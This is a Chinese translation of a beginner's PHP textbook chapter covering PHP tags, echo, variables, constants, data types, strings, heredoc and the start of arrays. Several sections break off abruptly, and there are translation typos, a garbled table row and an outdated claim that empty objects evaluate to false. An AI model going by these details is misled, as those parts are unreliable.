  \ 传递数据\n## 理解其他 Session \n\n# 第 1 章：了解 PHP 基础\n\n## 本章内容\n- 在 HTML 文件中添加 PHP 部分\n\
  - 编写 PHP 语句\n- 使用 PHP 变量和常量\n- 使用数组\n- 编写脚本文档\n\nPHP 是一种专门为 Web 开发设计的脚本语言。它具有许多功能，可以帮助你完成开发动态\
  \ Web 应用所需的编程任务。\n\n在本章中，我们将描述编写 PHP 脚本的基础知识——适用于所有 PHP 语句的规则。可以将这些规则比作通用语法和标点符号规则。在迷你书的其余章节中，你将了解到特定的\
  \ PHP 语句和特性，以及如何编写 PHP 脚本来执行特定任务。\n\n虽然这一章内容很长，但你已经通过上一本迷你书对 JavaScript 的回顾接触过编程。本章从基础开始，逐渐过渡到更复杂的内容。即使你之前有一定的\
  \ PHP 经验，从章节开头开始学习也是个好主意。\n\n## PHP 如何工作\nPHP 软件与 Web 服务器协作，Web 服务器是向世界传递网页的软件。当你在浏览器的地址栏中输入\
  \ URL 时，你正在向该 URL 的 Web 服务器发送消息，请求它向你发送 HTML 文件。Web 服务器通过发送请求的文件来响应。你的浏览器读取 HTML\
  \ 文件并显示网页。当你点击网页中的链接时，也会向 Web 服务器请求文件。此外，当你点击提交表单的网页按钮时，Web 服务器会处理文件。当安装了 PHP 后，这个过程是相同的：你请求一个文件，Web\
  \ 服务器恰好正在运行 PHP，由于 PHP 的编程支持，它向浏览器返回 HTML。\n\n![technicalstuff.eps](img/technicalstuff_fmt.png)\
  \ Web 服务器如何处理 PHP 文件\n\n当浏览器指向一个带有 `.html` 或 `.htm` 扩展名的普通 HTML 文件时，Web 服务器会将文件原样发送给浏览器。浏览器处理该文件并显示由\
  \ HTML 标签描述的网页。当浏览器指向一个 PHP 文件（扩展名为 `.php`）时，Web 服务器会查找文件中的 PHP 部分并对其进行处理，或者更准确地说，将它们交给\
  \ PHP 处理器，而不是仅仅原样发送给浏览器。Web 服务器/PHP 处理器处理 PHP 文件的方式如下：\n\n1. Web 服务器以 HTML 模式开始扫描文件。它假设语句是\
  \ HTML 并在不进行任何处理的情况下发送到浏览器。\n2. Web 服务器继续以 HTML 模式运行，直到遇到 PHP 标签（`<?php`）。\n3. 当遇到\
  \ PHP 开启标签时，Web 服务器将处理权交给 PHP 模块。这有时被称为“从 HTML 转逸”。随后，Web 服务器假设所有语句都是 PHP，并使用 PHP\
  \ 模块执行 PHP 语句。如果 PHP 有输出，服务器会将输出发送到浏览器。\n4. Web 服务器继续以 PHP 模式运行，直到遇到 PHP 标签（`?>`）。\n\
  5. 当 Web 服务器遇到 PHP 标签时，它返回 HTML 模式。并恢复扫描。\n\n更具体地说，当安装 PHP 时，服务器被配置为期望某些文件扩展名包含\
  \ PHP 语句。扩展名通常为 `.php` 或 `.phtml`，可以使用任何扩展名。（在本书中，我们假设 `.php` 是 PHP 脚本的扩展名）。当 Web\
  \ 服务器接收到指定扩展名文件的请求时，它原样发送 HTML 语句，但 PHP 语句在发送到浏览器之前会经过 PHP 软件的处理。\n\n当 PHP 语言语句被处理时，Web\
  \ 服务器仅会将输出或打印到屏幕上的任何内容发送到浏览器。PHP 语言语句（那些不在屏幕上产生任何输出的语句）不会包含在发送到浏览器的输出中，因此用户通常看不到代码。例如，在这个简单的\
  \ PHP 语句中，`<?php` 是 PHP 开启标签，`?>` 是结束标签。\n\n```php\n<?php echo \"<p>Hello World</p>\"\
  ; ?>\n```\n\n这里，`echo` 是一个 PHP 指令，告诉 PHP 输出随后的文本。PHP 软件处理该 PHP 语句并输出以下：\n\n```html\n\
  <p>Hello World</p>\n```\n\n该普通的 HTML 语句被传递到用户的浏览器。浏览器将该语句解释为 HTML 代码，并显示包含一个段落——Hello\
  \ World 的网页。PHP 语句没有传递到浏览器，因此用户永远看不到任何 PHP 语句。PHP 和 Web 服务器必须紧密合作。\n\nPHP 没有集成到所有的\
  \ Web 服务器中，但与许多流行的 Web 服务器兼容。PHP 与 Apache Web 服务器配合良好。PHP 还可以与 Microsoft Internet\
  \ Services (IIS) 等其他服务器配合。\n\n![tip.eps](img/tip_fmt.png) 如果你可以选择或影响组织内使用的 Web 服务器，请选择\
  \ Apache。Apache 本身就是一个很好的选择。它是免费、开源、稳定且受欢迎的。根据 www.netcraft.com 的 Web 服务器调查，它目前驱动了超过\
  \ 60% 的网站。它运行在 Windows、Linux、Mac OS 和大多数 Unix 变体上。\n\n## 检查 PHP 脚本的结构\n\n\n\n\n\n\
  PHP 在用于网页时是一种**嵌入式脚本语言**。这意味着 PHP 代码被嵌入在 HTML 代码中。你使用 HTML 标签来包裹嵌入到 HTML 文件中的 PHP\
  \ 语言——这就像你使用其他 HTML 标签的方式一样。你创建和编辑包含 PHP 的网页的方法与你创建和编辑普通 HTML 页面的方法完全相同。\n\nPHP\
  \ 语言语句封装在如下形式的 PHP 标签中：\n\n```php\n<?php      ?>\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ 有时，你可以使用更短版本的 PHP 标签。你可以尝试使用不带 `php` 的 `<?` 和 `?>`。如果启用了短标签（short tags），你就可以少打几个字符。但是，如果你使用了短标签，那么当你的脚本移动到另一个未启用\
  \ PHP 短标签的 Web 托管主机时，脚本将无法运行。\n\nPHP 处理两个 PHP 标签之间的所有语句。在 PHP 部分被处理后，它会被丢弃。或者，如果\
  \ PHP 语句产生了输出，PHP 部分将由输出所替换。浏览器看不到 PHP 部分——浏览器只能看到它的输出（如果有的话）。关于此过程的更多信息，请参阅侧边栏“Web\
  \ 服务器如何处理 PHP 文件”。\n\n作为一个示例，从一个在浏览器窗口中显示 `Hello World!` 的 HTML 脚本开始，如列表 1-1 所示。（在任何语言中编写的第一个脚本都是\
  \ Hello World 脚本，这是一个传统。当你第一次学习 HTML 时可能已经写过一个 Hello World 脚本。）\n\n#### 列表 1-1：Hello\
  \ World HTML 脚本\n\n```html\n<!doctype html>\n<html\n<head><title>Hello World Script</title></head>\n\
  <body>\n<p>Hello World!</p>\n</body>\n</html>\n```\n\n如果你在浏览器中打开这个 HTML 脚本，你会看到一个显示内容的网页：\n\
  \n`Hello World!`\n\n列表 1-2 显示了一个执行相同功能的 PHP 脚本——它在浏览器窗口中显示 `Hello World!`。\n\n####\
  \ 列表 1-2：Hello World PHP 脚本\n\n```html\n<!doctype html>\n<html>\n<head><title>Hello\
  \ World Script</title></head>\n<body>\n<?php\n  echo \"<p>Hello World!</p>\\n\"\
  ;\n?>\n</body>\n</html>\n```\n\n当你运行此脚本并在浏览器中查看它时，它显示与列表 1-1 中的 HTML 脚本相同的网页。但现在你是在使用\
  \ PHP 实现的！\n\n![remember.eps](img/remember_fmt.png) **不要直接用浏览器查看文件**。也就是说，不要从浏览器的菜单中选择“文件⇒打开文件”来导航到文件并点击它。你必须在浏览器的地址栏中输入其\
  \ URL 来打开文件。如果你在浏览器窗口中看到的是 PHP 代码而不是预期的输出，那么你可能没有通过 URL 启动文件。\n\n在这个 PHP 脚本中，PHP\
  \ 部分是：\n\n```php\n<?php\n  echo \"<p>Hello World!</p>\";\n?>\n```\n\nPHP 标签仅包裹了一个语句——一个\
  \ `echo` 语句。`echo` 语句是你将频繁使用的 PHP 语句。输出就是包含在双引号之间的文本。\n\n当 PHP 部分被处理时，它会被输出所替换。在这种情况下，输出是\
  \ `<p>Hello World!</p>`。\n\n如果你将列表 1-2 中的 PHP 部分替换为先前的输出，该脚本现在看起来与列表 1-1 中的 HTML\
  \ 脚本完全一样。如果你在浏览器中打开任何一个脚本，你都会看到相同的网页。如果你查看浏览器看到的源代码（在浏览器中，选择“查看⇒源代码”），你会看到两个脚本的相同的源代码列表。\n\
  \n你可以在脚本中包含任意数量的 PHP 部分，也可以包含任意数量的 HTML 部分，甚至可以零个 PHP 或 HTML 部分。例如，以下脚本有两个 PHP 部分和两个\
  \ HTML 部分：\n\n```html\n<html>\n<head><title>Hello World Script</title></head>\n\
  <body>\n<?php\n  echo \"<p>Hello World!</p>\";\n?>\n<p>This is HTML only.</p>\n\
  <?php\n  echo \"<p>Hello World again!</p>\";\n?>\n<p> This is a second HTML section.</p>\n\
  </body>\n</html>\n```\n\n### 学习 PHP 语法\n\n你添加到 HTML 文件中的 PHP 部分由一系列 PHP 语句组成。每条\
  \ PHP 语句都是让 PHP 执行某些操作的指令。出于本书的目的，我们将 PHP 语句分为简单语句或复杂语句。\n\n![technicalstuff.eps](img/technicalstuff_fmt.png)\
  \ PHP 语言的语法与 C 语言的语法相似，因此如果你有 C 语言，你会习惯。\n\n#### 使用简单语句\n\n简单语句是让 PHP 执行某些操作的指令。列表\
  \ 1-2](#21_9781118213704-bk04ch01.html_l2)所示的 `echo` 语句是一个 PHP 语句。![check.eps](img/check.png)\
  \ PHP 语句可以大写或小写。在 `echo` 语句中，`Echo`、`echo` 和 `ECHO` 对 PHP 来说都是相同的，就像在 JavaScript\
  \ 中一样。以下是一条有效的 PHP 语句：\n\n```php\n<?php echo \"<p>Hello World!</p>\" ?>\n```\n\n\
  `echo` 语句与 PHP 标签在同一行。PHP 读取语句直到遇到标签。下一个示例也产生相同的输出：\n\n```php\n<?php\n  echo \"\
  <p>Hello</p>\";\n  echo \"<p>World</p>\";\n?>\n```\n\n这个示例包含两个 `echo` 语句。如果你愿意，可以将整个\
  \ PHP 部分写在同一行，只要用分号分隔语句即可。\n\n#### 使用复杂语句\n\n有时一组简单语句会被组合成一个块。块由大括号 `{` 和 `}` 包裹。一组语句会一起执行。块的常用用法是条件块，即当某些条件成立时执行语句。例如，你可能希望脚本执行以下操作：\n\
  \n```php\nif (the sky is blue)\n{\n  put leash on dragon;\n  take dragon for a walk\
  \ in the park;\n}\n```\n\n这些语句封装在大括号中，以确保它们作为一个块执行。如果天空是蓝色的，两个语句都会执行。![check.png\
  \ 使用块的 PHP 语句（例如 `if` 语句，我们在本书的第 2 章](../22_9781118213704-bk04ch02.html 介绍）我们所谓的复杂语句。PHP\
  \ 读取整个复杂语句，不会在遇到第一个分号时停止。PHP 知道要预期一个或多个块，并寻找最后一个块的结束大括号。\n\n### 编写 PHP 代码\n\nPHP\
  \ 代码必须被人类阅读，也要被 PHP 软件读取。PHP 脚本由人类编写，并必须由人类进行修改、更新和维护。脚本可能在一年或两年后需要修改，那时原始程序员可能去热带海滩退休了。必须修改脚本的人需要阅读并理解该脚本，而他/她以前从未见过它。因此，PHP\
  \ 代码必须编写成易于人类快速理解的风格。\n\n\n\n\n\n通常情况下，每个 PHP 简单语句都写在一行，并以分号结尾。\n\n在编写块（复杂）语句时，编码风格规定你应当对块语句进行缩进，以清晰地显示块的开始和结束位置。例如，在下面的条件语句示例中，块中的简单语句被缩进了：\n\
  \n```\nif(the sky is blue)\n{\n  put leash on dragon;\n  take dragon for a walk\
  \ in the park;\n}\n```\n\nPHP 不需要缩进，但有助于人类阅读代码。\n\n在左大括号的放置上有两种常用的样式，如下：\n\n```php\n\
  if(the sky is blue)\n{\n  put leash on dragon;\n  take dragon for a walk in the\
  \ park;\n}\n```\n\n```php\nif(the sky is blue) {\n  put leash on dragon;\n  take\
  \ dragon for a walk in the park;\n}\n```\n\n# 在网页中显示内容\n\n你使用 `echo` 或 `print` 语句在网页上显示内容；它们的作用相同。`echo`\
  \ 或 `print` 语句会产生输出，并将该输出发送到用户的浏览器。事实上，在本章中任何你看到 `echo` 的地方都可以写成 `print`。浏览器会将输出处理为\
  \ HTML。\n\n`echo` 语句的一般格式为\n\n`echo outputitem,outputitem,outputitem,......`\n\n\
  适用以下规则：\n\n![check](img/check.png) `outputitem` 可以是一个数字、字符串或变量（变量将在本文后的使用 PHP 变量\
  \ 部分讨论）。字符串必须包含在引号中。\n\n![check](img/check.png) 列出你需要的任意 `outputitem`，并用逗号分隔。\n\n\
  表 1-1 显示了一些 `echo` 语句及其输出。\n\n### 表 1-1 echo 语句\n\n| echo 语句 | 输出 |\n| :--- | :---\
  \ |\n| `echo \"Hello\";` | `Hello` |\n| `echo 123;` | `123` |\n| `echo \"Hello\"\
  ,\"World!\";` | `HelloWorld!` |\n| `echo Hello World!;` | 无效；结果为错误消息 |\n| `echo\
  \ \"Hello World!\";` | `Hello World!` |\n| `echo 'Hello World!';` | `Hello World!`\
  \ |\n\n`echo` 和 `print` 语句输出一行发送到浏览器的文本。浏览器将文本视为 HTML 并以这种方式处理它。因此，你需要确保你的输出是有效的\
  \ HTML 代码，用于描述你想让用户看到的网页。\n\n当你想要使用 PHP 显示网页（或网页的局部）时，你需要考虑生成网页涉及的三个部分：\n\n- ![check](img/check.png)\
  \ PHP 脚本：你编写的 PHP 语句。\n- ![check](img/check.png) HTML 源代码：当你在浏览器中选择“查看⇒网页源代码”时所看到的网页源代码。该源代码是\
  \ `echo` 或 `print` 语句的输出。\n- ![check](img/check.png) 网页：你的用户看到的网页。网页是由 HTML 源代码生成的。\n\
  \n- ![remember.eps](img/remember_fmt.png) `echo` 或 `print` 语句会将你发送到浏览器的内容原封不动地发送——不多不少。如果你不输出任何\
  \ HTML 标签，就什么都不会发送。\n\nPHP 允许一些格式化输出的特殊字符，但它们不是 HTML 标签。PHP 特殊字符只影响 `echo` 或 `print`\
  \ 语句的输出，而不影响在网页上的显示。例如，如果你想在 PHP 输出或 HTML 源代码中换行，你必须包含一个特殊字符（`\\n`），告诉 PHP 开始新行。然而，这个特殊字符只是在输出中开启一个新行；它不会向生成的网页发送一个用于换行的实际\
  \ HTML 标签。表 1-2 显示了这部分的示例。\n\n### 表 1-2 网页交付阶段\n\n| echo 语句 | HTML 源代码 | 网页显示 |\n\
  | :--- | :--- | :--- |\n| `echo \"Hello World!\";` | `Hello World!` | Hello World!\
  \ |\n| `echo \"Hello World!\"; echo \"Here I am!\";` | `Hello World!Here I am!`\
  \ | Hello World!Here I am! |\n| `echo \"Hello World!\\n\"; echo \"Here I am!\";`\
  \ | `Hello World!Here I am` | Hello World! Here I am! |\n| `echo \"Hello World!\"\
  ;echo \"<br />\";echo \"Here I am!\";` | `Hello World!<br />Here I am!` | Hello\
  \ World!Here I am! |\n| `echo \"Hello\"; echo \" World!<br />\\n\";echo \"Here I\
  \ am!\";` | `Hello World!<br />Here I am!` | Hello World!Here I am! |\n\n表 1-2 总结了这三个部分之间的差异。\n\
  \n\n\n\n\n![check](img/check.png) 大小敏感：大写字母和小写字母是不相同的。例如，`$firstname` 和 `$Firstname`\
  \ 不是同一个变量。如果你将信息存储在 `$firstname` 中，你无法通过变量名 `$firstName` 来访问该信息。\n\n![tip.eps](img/tip_fmt.png)\
  \ 在命名变量时，请使用能够清晰表达变量中信息的名称。使用像 `$var1`、`$var2`、`$A` 或 `$B` 这样的变量名对提高脚本清晰度没有帮助。虽然\
  \ PHP 不你如何命名变量，也不会产生混淆，但尝试理解脚本的人将很难跟踪哪个变量存储了什么信息。像 `$firstName`、`$age` 和 `$orderTotal`\
  \ 这样的变量名更有描述性且更有帮助。\n\n## 创建并为变量赋值\n\n变量可以存储数字或字符字符串。你使用单个等号（=`）将信息存储在变量中。例如，以下四个\
  \ PHP 语句将信息赋值给变量：\n\n```\n$age = 12;\n$price = 2.55;\n$number = -2;\n$name = \"\
  Little Bo Peep\";\n```\n\n注意，字符串被包含在引号中，但数字没有。我们将在本章稍后的 理解数据类型 部分详细讨论如何使用数字和字符。\n\
  \n每当你将信息放入一个之前不存在的变量时，你就创建了该变量。例如，假设你使用了以下 PHP 语句：\n\n```\n$firstname = \"George\"\
  ;\n```\n\n如果这条语句是 le 第一次提到变量 `$firstname`，那么这条语句将创建该变量并将其设置为 `\"George\"`。如果你之前有一条语句将\
  \ `$firstname` 设置为 `\"Mary\"`，那么这条语句会将 `$firstname` 的值更改为 `\"George\"`。\n\n你也可以从变量中移除信息。你可能这样做是为了清除信息或初始化变量。例如，以下语句从变量\
  \ `$age` 中取出了信息：\n\n```\n$age = \"\";\n```\n\n变量 `$age` 存在，但不包含任何值。这并不意味着 `$age`\
  \ 被设置为 `0`（零），因为 0 是一个值。它意味着 `$age` 不存储任何信息。它包含一个长度为 0 的字符串。\n\n你可以更进一步，使用这条语句销毁变量：\n\
  \n```\nunset($age);\n```\n\n在执行这条语句后，变量 `$age` 不再存在。\n\n## 使用可变量\n\nPHP 允许你使用动态变量名，称为可变量（variable\
  \ variables）。你可以用另一个变量中存储的值来命名变量。\n\n也就是说，一个变量包含了另一个变量的名字。例如，假设你想创建一个名为 `$city`\
  \ 且值为 `Los Angeles` 的变量。你可以使用以下语句：\n\n```\n$name_of_the_variable = \"city\";\n```\n\
  \n这条语句创建了一个变量，其中包含了你想给变量命的名称。然后，你使用以下语句：\n\n```\n$$name_of_the_variable = \"Los\
  \ Angeles\";\n```\n\n注意变量名开头多出来的美元符号（`$`）。这表示这是一个可变量。这条语句创建了一个新变量，其名称是 `$name_of_the_variable`\
  \ 的值，产生结果如下：\n\n```\n$city = \"Los Angeles\";\n```\n\n`$name_of_the_variable` 的值没有改变。\n\
  \n下面的示例展示了此功能如何工作。在目前的形式下，脚本语句可能看起来并不有用；你可能会看到更好的方法来编写此任务。当可变量与数组和循环结合使用时，它们的真正价值就会显而易见，正如本文的第\
  \ 2 章 中的那样。\n\n假设你想用城市名称命名一系列变量，其值为这些城市的人口。你可以使用以下代码：\n\n```\n$Reno = 360000;\n\
  $Pasadena = 138000;\n$cityname = \"Reno\";\necho \"The size of $cityname is ${$cityname}\"\
  ;\n$cityname = \"Pasadena\";\necho \"The size of $cityname is ${$cityname}\";\n\
  ```\n\n这段代码的输出是：\n\n`The size of Reno is 360000`\n`The size of Pasadena is 138000`\n\
  \n注意，在 `echo` 语句的变量名周围使用大括号，以便 PHP 知道变量名的边界。如果你在不使用大括号的情况下使用语句，输出如下：\n\n`The size\
  \ of Reno is $Reno`\n\n在 `$$cityname` 中不使用大括号时，PHP 将 `$cityname` 转换为其值，并将额外的 `$`\
  \ 放在它前面，作为前一个字符串的一部分。\n\n## 显示变量值\n\n你可以使用以下任何语句显示变量中的值：\n\n- ![check](img/check.png)\
  \ `echo`\n- ![check](img/check.png) `print`\n- ![check](img/check.png) `print_r`\n\
  - ![check](img/check.png) `var_dump`\n\n## 在 echo 和 print 语句中使用变量\n\n你可以使用 `echo`\
  \ 或 `print` 语句在网页上显示变量中的值。\n\n例如，如果你将 `$age` 设置为 12，然后使用以下行：\n\n```html\n<p>Your\
  \ age is <?php echo $age; ?></p>\n```\n\n页面上的输出为 `Your age is 12`。\n\n\n\n\n你可以编写以下语句来显示变量的值：\n\
  \n```php\n$weekday = \"Monday\";\nvar_dump($weekday);\n```\n\n`var_dump` 的输出是：\n\
  \n```\nstring(6) \"Monday\"\n```\n\n输出显示 `$weekday` 的值是 `Monday`。输出还显示该值是一个长度为六字符的字符串数据类型。\n\
  \n![remember.eps](img/remember_fmt.png) 你在调试 PHP 错误时会频繁使用 `var_dump`。它对于该目的至关重要。\n\
  \n## 使用 PHP 常量\n\nPHP 常量与变量相似。常量被赋予一个名称，并在存储一个值。然而，常量是恒定的；也就是说，它们不能被脚本更改。一旦你设置了常量的值，它就会保持不变。例如，如果你为\
  \ `age` 使用了常量并将其设置为 `21`，那么该值将永远是 `21`。\n\n当一个值在脚本的多个地方需要且在脚本运行期间不会改变时，就会使用常量。该值在脚本开始时设置在常量中。在整个脚本中使用常量而不是变量，你可以确保值不会被意外更改。通过给它命名，你可以立即知道该信息是什么。通过在脚本开始时设置一次常量（而不是在整个脚本中使用该值），如果需要，你可以在一处更改常量的值，而不需要在脚本的许多地方查找该值进行更改。\n\
  \n例如，你可能会设置一个常量作为公司名称，另一个常量作为公司地址，并在需要的地方使用它们。那么，如果公司搬迁，你只需要更改脚本开头公司地址常量的值，而不需要找到并更改脚本中每个输出公司名称的地方。\n\
  \n你通过使用 `define` 语句设置常量。格式如下：\n\n```php\ndefine(\"constantname\",\"constantvalue\"\
  );\n```\n\n例如，要设置一个公司名称常量，请使用以下语句：\n\n```php\ndefine(\"COMPANY\",\"My Fine Company\"\
  );\n```\n\n在脚本中任何需要公司名称的地方使用常量：\n\n```php\necho COMPANY;\n```\n\n![remember.eps](img/remember_fmt.png)\
  \ 当你输出常量时，不能将其包含在引号中。如果你这样做，你输出的是常量名，而不是值。你可以像前面的示例那样不带任何东西地输出它，或者将其括在括号。\n\n你可以为常量使用任何可以用于变量的名称，只要你遵循以下约定：\n\
  \n- ![check](img/check.png) **无标识符**：常量名不以美元符号 (`$`) 开头。\n- ![check](img/check.png)\
  \ **大小写**：根据惯例，常量名全大写，这样你可以轻松发现常量，但 PHP 本身并不关心你如何命名常量。你不必使用大写；这只是为了清晰。\n- ![check](img/check.png)\
  \ **字符**：你可以在其中存储字符串或数字。以下语句对于 PHP 来说完全没问题：\n\n```php\ndefine (\"AGE\",29);\n```\n\
  \n## 理解数据类型\n\n存储在变量或常量中的值是以特定类型的数据存储的。PHP 这八种数据类型：\n\n- ![check](img/check.png)\
  \ **整数**：整数\n- ![check](img/check.png) **浮点数 (float)**：带有小数位的数值值\n- ![check](img/check.png)\
  \ **字符串 (String)**：一系列字符\n- ![check](img/check.png) **布尔值 (Boolean)**：可以是真或假的值\n\
  - ![check](img/check.png) **NULL**：代表无值的值\n- ![check](img/check.png) **数组 (Array)**：一个变量中的值组\n\
  - ![check](img/check.png) **对象 (Object)**：用类创建的结构\n- ![check](img/check.png) **资源\
  \ (Resource)**：标识连接的引用\n\n处理数据类型你需要了解的一些事项：\n\n- ![check](img/check.png) PHP 自动确定数据类型。在编写\
  \ PHP 脚本时，你不需要指定你正在存储什么数据类型。以下两个语句存储了不同的数据类型：\n\n```php\n$var1 = 123;\n$var2 = \"\
  123\";\n```\n\n- ![check](img/check.png) `$var1` 的值存储为整数。`$var2` 的值存储为字符串，因为它在引号中。\n\
  - ![check](img/check.png) PHP 在需要时会自动转换数据类型。例如，如果你相两个变量，一个包含整数而另一个包含浮点数，PHP 会将整数转换为浮点数以便将两者相加。\n\
  - ![check](img/check.png) 你可以确定数据类型。有时，你可能想将一个值存储为与 PHP 自动存储类型不同的数据类型。你可以使用强制转换为变量设置数据类型，如下：\n\
  \n```php\n$var3 = \"222\";\n$var4 = (int) $var3;\n```\n\n- ![check](img/check.png)\
  \ 该语句将 `$var4` 设置为 `$var3` 中的值，将值从字符串改为整数。你也可以使用 `(float)` 或 `(string)` 进行强制转换。\n\
  - ![check](img/check.png) 你可以查询数据类型。你可以通过 `var_dump()` 变量中存储了什么数据类型。例如，你可以如下显示变量：\n\
  \n```php\nvar_dump($var4);\n```\n\n\n\n你可以使用括号来改变算术运算的顺序。括号内的运算优先执行。例如，你可以像这样使用括号编写前面的语句：\n\
  \n```php\n$result = (1 + 2) * 4 + 1;\n```\n\n该语句将 `$result` 设置为 `13`，执行顺序如下：\n\n\
  ```php\n$result = (1 + 2) * 4 + 1  (首先执行括号内的数学运算。)\n$result = 3 * 4 + 1       (接下来执行乘法。)\n\
  $result = 12 + 1          (接下来执行加法。)\n$result = 13\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ **提示：** 根据“宁可信慎于治疗”的原则，当可能存在多种答案时，最好使用括号。\n\n### 将数字格式化为金额\n\n通常情况下，你处理的数字是金额，例如产品价格。你希望客户在网页上看到正确格式的的价格。换句话说，金额应该始终保留两位小数。然而，PHP\
  \ 以最高效的形式存储和显示数字。如果数字是 `10.00`，它会被显示为 `10`。要将数字格式化为美元格式，你可以使用 `sprintf`。以下语句将数字格式化为美元格式：\n\
  \n```php\n$newvariablename = sprintf(\"%01.2f\", $oldvariablename);\n```\n\n该语句重新格式化\
  \ `$oldvariablename` 中的数字，并将其新格式存储在 `$newvariablename` 中，后者是一个字符串数据类型。例如，以下语句可以以正确的格式显示金额：\n\
  \n```php\n$price = 25;\n$f_price = sprintf(\"%01.2f\",$price);\necho \"$f_price\"\
  ;\n```\n\n你在网页上会看到如下：\n\n```\n25.00\n```\n\n如果你使用 `var_dump($f_price)` 显示变量，输出为：\n\
  \n```\nstring(5) \"25.00\"\n```\n\n如果你想在数字中使用逗号分隔千位数，可以使用 `number_format`。以下语句创建一个带有逗号的美元格式：\n\
  \n```php\n$price = 25000;\n$f_price = number_format($price,2);\necho \"$f_price\"\
  ;\n```\n\n你在网页上会看到如下：\n\n```\n25,000.00\n```\n\n![tip.eps](img/tip_fmt.png) **提示：**\
  \ `number_format` 语句中的 `2` 将格式设置为两位小数。你可以使用任何数字来获取任意数量的小数。此外，你可以在输出的金额前添加 `$`，如下：\n\
  \n```php\necho \"$\" . $f_price;\n```\n\n#### 处理字符串\n\n字符串是一系列字符。字符包括字母、数字和标点符号。当数字被用字符时，它只是一个存储的字符，与字母相同。它不能用于运算。例如，电话号码被存储为字符串，因为它只需要存储——而不是相加或相乘。\n\
  \n#### 将字符串赋值给变量\n\n当你将字符串存储在变量中，通过双引号或单引号告诉 PHP 字符串的开始和结束。例如，以下两个语句的结果相同：\n\n```php\n\
  $string = \"Hello World!\";\n$string = 'Hello World!';\n```\n\n然而，假设你想存储如下字符串：\n\
  \n```php\n$string = 'It is Sally's house';\necho $string;\n```\n\n这些语句无法工作，因为当 PHP\
  \ 看到 `Sally` 后的 `'`（单引号）时，它认为这是字符串的结束，显示如下内容：\n\n```\nIt is Sally\n```\n\n你需要告诉\
  \ PHP 将单引号（`'`）解释为撇号，而不是字符串的结束。你可以通过在单引号前使用反斜杠（`\\`）来实现这一点。反斜杠告诉 PHP 该单引号没有特殊含义；它只是一个撇号。这被称为字符的转义。使用以下语句显示整个字符串：\n\
  \n```php\n$string = 'It is Sally\\'s house';\necho $string;\n```\n\n![remember.eps](img/remember_fmt.png)\
  \ **记住：** 同样，当你用双引号括围字符串时，你必须在字符串中的任何双引号前也使用反斜杠。\n\n#### 在字符串中使用单引号和双引号\n\n单引号字符串和双引号字符串的处理方式如下：\n\
  \n![check](img/check.png) 单引号字符串以字面形式存储——除了 `\\'`，它会被存储为撇号。\n\n![check](img/check.png)\
  \ 在双引号字符串中，变量和某些特殊字符在字符串存储之前会被求值。\n\n以下是代码中使用双引号或单引号时最重要的区别：\n\n![check](img/check.png)\
  \ 处理变量：如果你将变量括在双引号中，PHP 会使用变量的值。然而，如果你将变量括在单引号中，PHP 将使用字面变量名。例如，如果你使用以下语句：\n\n```php\n\
  $month = 12;\n$result1 = \"$month\";\n$result2 = '$month';\necho $result1;\n```\n\
  \n\n\n\n`ENDSTRING` 可以包含你想要的任何字符串，稍后你会看到。你通过在一开始和结尾输入 `ENDSTRING` 来将文本存入变量 `$varname`。当\
  \ PHP 处理 `heredoc` 时，它会读取第一个 `ENDSTRING` 并开始将文本读入 `$varname`。它持续将文本读入 `$varname`，直到再次遇到相同的\
  \ `ENDSTRING`。此时，字符串结束。由 `heredoc` 语句创建的字符串会像双引号字符串一样解析变量和特殊字符。\n\n以下语句使用 `heredoc`\
  \ 方法创建字符串：\n\n```php\n$distance = 10;\n$herevariable = <<<ENDOFTEXT\nThe distance\
  \ between\nLos Angeles and Pasadena\nIs $distance miles.\nENDOFTEXT;\necho $herevariable;\n\
  ```\n\n`echo` 语句的输出如下：\n\n`The distance between Los Angeles and Pasadena is 10 miles.`\n\
  \n![warning_bomb.eps](img/warning_bomb_fmt.png) 但要注意。PHP 对它的 `ENDSTRING` 很挑剔。当它第一次出现时，`ENDSTRING`（本例中的\
  \ `ENDOFTEXT`）必须出现在第一行的末尾，后面不能有任何内容，甚至不能有空格。而最后一行的 `ENDSTRING` 必须出现在行首，前面不能有任何内容，甚至不能有空格，后面除了分号外也不能有任何内容。如果违反这些规则，PHP\
  \ 将无法识别结束字符串，并会在脚本的其余部分继续寻找它。最终会显示一个解析错误，指出脚本最后一行的行号。\n\n## 使用布尔数据类型\n\n布尔数据类型只取\
  \ `true` 或 `false` 两个值。你可以像下面这样将布尔值赋给变量：\n\n```php\n$var1 = true;\n```\n\nPHP 将变量设置为布尔数据类型。布尔值用于比较值和表达式，以用于条件语句（如\
  \ `if` 语句）。比较值的详细内容请参见本小册的第 2 章。\n\n以下值会被 PHP 评估为 `false`：\n\n* ![check](img/check.png)\
  \ 单词 false\n* ![check](img/check.png) 整数 0\n* ![check](img/check.png) 浮点数 0.0\n\
  * ![check](img/check.png) 空字符串\n* ![check](img/check.png) 值为 `0` 的字符串\n* ![check](img/check.png)\
  \ 空数组\n* ![check](img/check.png) 空对象\n* ![check](img/check.png) 值 `NULL`\n\n如果变量包含的值不被评估为\
  \ `false`，则它被赋值为 `true`。\n\n## 使用 NULL 数据类型\n\nNULL 数据类型的唯一值是 `NULL`。你可以像下面这样将值赋给变量：\n\
  \n```php\n$var1 = NULL;\n```\n\n值为 `NULL` 的变量不包含任何值。\n\n## 使用数组\n\n数组是复杂变量。数组将一组值存储在一个变量名下，对于存储相关值非常有用。例如，你可以将关于一朵花的信息（如品种、颜色和价格）存储在一个名为\
  \ `$flowerinfo` 的数组中。数组中的信息可以轻松地处理、访问和修改。例如，PHP 有几种对数组进行排序的方法。以下部分将为你介绍数组的基础知识。\n\
  \n### 创建数组\n\n创建数组最简单的方法是将值赋给一个变量名末尾带有方括号（`[ ]`）的变量。例如，假设你在脚本中之前没有引用过 `$cities`，那么以下语句会创建一个名为\
  \ `$cities` 的数组：\n\n```php\n$cities[1] = \"Phoenix\";\n```\n\n此时，名为 `$cities` 的数组已创建，并且只有一个值：`Phoenix`。接下来，你使用以下语句：\n\
  \n```php\n$cities[2] = \"Tucson\";\n$cities[3] = \"Flagstaff\";\n```\n\n现在数组 `$cities`\
  \ 包含三个值：`Phoenix`、`Tucson` 和 `Flagstaff`。\n\n数组可以看作是一个键/值对的列表。每个键/值对称为一个元素。要获取特定值，你需要在方括号中指定键。在前面的数组中，键是数字——1、2\
  \ 和 3。然而，你也可以使用单词作为键。例如，以下语句创建了一个州首府数组：\n\n```php\n$capitals['CA'] = \"Sacramento\"\
